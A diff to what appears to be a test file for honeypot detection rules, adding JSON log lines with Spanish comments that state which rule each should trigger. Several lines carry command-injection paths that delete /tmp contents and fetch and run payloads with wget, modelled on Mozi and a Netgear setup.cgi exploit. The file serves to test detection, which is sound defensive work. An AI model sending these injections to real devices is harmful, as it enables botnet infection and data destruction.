@@ -71,6 +71,29 @@
 #@ expect=100340 not=100380
 {"timestamp": "2026-11-20 09:10:18", "honeypot_event": "http_request", "ip": "203.0.113.76", "method": "GET", "path": "/setup.cgi?todo=login"}
 
+# (100384) inyeccion de comando generica con descarga (caso Mozi del 25/11, con IP de documentacion)
+#@ expect=100384
+{"timestamp": "2026-11-25 09:00:01", "honeypot_event": "http_request", "ip": "203.0.113.77", "method": "GET", "path": "/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://203.0.113.9:42587/Mozi.m"}
+
+# El exploit de Netgear lleva cmd=...wget pero tiene que seguir ganando 100380 (mas especifica, va antes)
+#@ expect=100380 not=100384
+{"timestamp": "2026-11-25 09:00:02", "honeypot_event": "http_request", "ip": "203.0.113.78", "method": "GET", "path": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://203.0.113.9/x;sh+x"}
+
+# cmd= sin descargador (o con una palabra que solo empieza igual) no debe disparar 100384
+#@ expect=100340 not=100384
+{"timestamp": "2026-11-25 09:00:03", "honeypot_event": "http_request", "ip": "203.0.113.79", "method": "GET", "path": "/index.php?cmd=curly&mode=help"}
+
+# (100385) ruta checksum8
+#@ expect=100385
+{"timestamp": "2026-11-25 09:00:04", "honeypot_event": "http_request", "ip": "203.0.113.80", "method": "GET", "path": "/aab8"}
+
+#@ expect=100385
+{"timestamp": "2026-11-25 09:00:05", "honeypot_event": "http_request", "ip": "203.0.113.80", "method": "GET", "path": "/aaa9"}
+
+# Una ruta parecida cuya suma no da 92 ni 93 no debe disparar 100385
+#@ expect=100340 not=100385
+{"timestamp": "2026-11-25 09:00:06", "honeypot_event": "http_request", "ip": "203.0.113.81", "method": "GET", "path": "/aab7"}
+
 # (100346) rafaga: muchos requests de la misma IP en poco tiempo. Umbral 10 en 120 s; se manda 12 veces.
 #@ session=rafaga repeat=12 expect=100346
 {"timestamp": "2026-10-30 09:10:13", "honeypot_event": "http_request", "ip": "203.0.113.70", "method": "GET", "path": "/"}
